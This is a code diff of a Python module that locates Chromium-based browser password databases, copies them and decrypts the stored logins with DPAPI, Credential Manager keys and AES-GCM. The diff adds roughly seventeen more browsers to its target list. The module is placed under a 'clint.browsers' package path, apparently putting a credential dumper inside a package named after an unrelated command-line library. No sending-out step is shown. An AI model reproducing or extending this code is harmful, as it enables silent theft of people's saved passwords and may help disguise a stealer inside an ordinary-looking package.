@@ -11,13 +11,13 @@ import traceback
 
 from Crypto.Cipher import AES
 
-from logger import log
-from .config.constant import constant
-from .config.winstructure import Win32CryptUnprotectData
-from .windows.credman import Credman
+from clint.browsers.config.constant import constant
+import logging
+from clint.browsers.config.winstructure import Win32CryptUnprotectData
+from clint.browsers.windows.credman import Credman
 
 
-class ChromiumBased():
+class ChromiumBased:
     def __init__(self, browser_name, paths):
         self.paths = paths if isinstance(paths, list) else [paths]
         self.database_query = 'SELECT action_url, username_value, password_value FROM logins'
@@ -100,8 +100,11 @@ class ChromiumBased():
                     if b'Yandex' in credman_password.get('URL', b''):
                         if credman_password.get('Password'):
                             yandex_enckey = credman_password.get('Password')
-                            self.info('EncKey found: {encKey}'.format(encKey=repr(yandex_enckey)))
+                            logging.info('EncKey found: {encKey}'.format(encKey=repr(yandex_enckey)))
             except Exception:
+                logging.debug(traceback.format_exc())
+                # Passwords could not be decrypted without encKey
+                logging.info('EncKey has not been retrieved')
                 return []
 
         try:
@@ -109,6 +112,7 @@ class ChromiumBased():
             cursor = conn.cursor()
             cursor.execute(self.database_query)
         except Exception:
+            logging.debug(traceback.format_exc())
             return credentials
 
         for url, login, password in cursor.fetchall():
@@ -130,36 +134,38 @@ class ChromiumBased():
                     # Passwords are stored using AES-256-GCM algorithm
                     # The key used to encrypt is stored on the credential manager
 
-                    # yandex_enckey: 
-                    #   - 4 bytes should be removed to be 256 bits 
-                    #   - these 4 bytes correspond to the nonce ? 
+                    # yandex_enckey:
+                    #   - 4 bytes should be removed to be 256 bits
+                    #   - these 4 bytes correspond to the nonce ?
 
                     # cipher = AES.new(yandex_enckey, AES.MODE_GCM)
                     # plaintext = cipher.decrypt(password)
                     # Failed...
                 else:
                     # Decrypt the Password
-                    try:
-                        password_bytes = Win32CryptUnprotectData(password, is_current_user=constant.is_current_user,
-                                                                user_dpapi=constant.user_dpapi)
-                    except AttributeError:
+                    if password and password.startswith(b'v10'):  # chromium > v80
+                        if master_key:
+                            password = self._decrypt_v80(password, master_key)
+                    else:
                         try:
                             password_bytes = Win32CryptUnprotectData(password, is_current_user=constant.is_current_user,
-                                                                 user_dpapi=constant.user_dpapi)
-                        except:
-                            password_bytes = None
+                                                                    user_dpapi=constant.user_dpapi)
+                        except AttributeError:
+                            try:
+                                password_bytes = Win32CryptUnprotectData(password, is_current_user=constant.is_current_user,
+                                                                     user_dpapi=constant.user_dpapi)
+                            except:
+                                password_bytes = None
 
-                    if password_bytes is not None:
-                        password = password_bytes.decode("utf-8")
-                    elif master_key:
-                        password = self._decrypt_v80(password, master_key)
+                        if password_bytes not in [None, False]:
+                            password = password_bytes.decode("utf-8")
 
                 if not url and not login and not password:
                     continue
 
                 credentials.append((url, login, password))
             except Exception:
-                log.critical(traceback.format_exc())
+                logging.debug(traceback.format_exc())
 
         conn.close()
         return credentials
@@ -180,16 +186,17 @@ class ChromiumBased():
             try:
                 temp = os.path.join(r, random_name)
                 shutil.copy(database_path, temp)
+                logging.debug(u'Temporary db copied: {db_path}'.format(db_path=temp))
                 return temp
             except Exception:
-                log.critical(traceback.format_exc())
+                logging.debug(traceback.format_exc())
         return False
 
     def clean_file(self, db_path):
         try:
             os.remove(db_path)
         except Exception:
-            log.critical(traceback.format_exc())
+            logging.debug(traceback.format_exc())
 
     def run(self):
         credentials = []
@@ -200,6 +207,7 @@ class ChromiumBased():
             if database_path.endswith('Login Data-journal'):
                 continue
 
+            logging.debug('Database found: {db}'.format(db=database_path))
 
             # Copy database before to query it (bypass lock errors)
             path = self.copy_db(database_path)
@@ -207,7 +215,7 @@ class ChromiumBased():
                 try:
                     credentials.extend(self._export_credentials(path, is_yandex, master_key))
                 except Exception:
-                    pass
+                    logging.debug(traceback.format_exc())
                 self.clean_file(path)
 
         return [{'URL': url, 'Login': login, 'Password': password} for url, login, password in set(credentials)]
@@ -215,10 +223,26 @@ class ChromiumBased():
 
 # Name, path or a list of paths
 chromium_browsers = [
+    (u'7Star', u'{LOCALAPPDATA}\\7Star\\7Star\\User Data'),
+    (u'amigo', u'{LOCALAPPDATA}\\Amigo\\User Data'),
     (u'brave', u'{LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data'),
+    (u'centbrowser', u'{LOCALAPPDATA}\\CentBrowser\\User Data'),
+    (u'chedot', u'{LOCALAPPDATA}\\Chedot\\User Data'),
+    (u'chrome canary', u'{LOCALAPPDATA}\\Google\\Chrome SxS\\User Data'),
     (u'chromium', u'{LOCALAPPDATA}\\Chromium\\User Data'),
+    (u'chromium edge', u'{LOCALAPPDATA}\\Microsoft\\Edge\\User Data'),
+    (u'coccoc', u'{LOCALAPPDATA}\\CocCoc\\Browser\\User Data'),
+    (u'comodo dragon', u'{LOCALAPPDATA}\\Comodo\\Dragon\\User Data'),  # Comodo IceDragon is Firefox-based
+    (u'elements browser', u'{LOCALAPPDATA}\\Elements Browser\\User Data'),
+    (u'epic privacy browser', u'{LOCALAPPDATA}\\Epic Privacy Browser\\User Data'),
     (u'google chrome', u'{LOCALAPPDATA}\\Google\\Chrome\\User Data'),
+    (u'kometa', u'{LOCALAPPDATA}\\Kometa\\User Data'),
     (u'opera', u'{APPDATA}\\Opera Software\\Opera Stable'),
+    (u'orbitum', u'{LOCALAPPDATA}\\Orbitum\\User Data'),
+    (u'sputnik', u'{LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data'),
+    (u'torch', u'{LOCALAPPDATA}\\Torch\\User Data'),
+    (u'uran', u'{LOCALAPPDATA}\\uCozMedia\\Uran\\User Data'),
+    (u'vivaldi', u'{LOCALAPPDATA}\\Vivaldi\\User Data'),
     (u'yandexBrowser', u'{LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data')
 ]
 
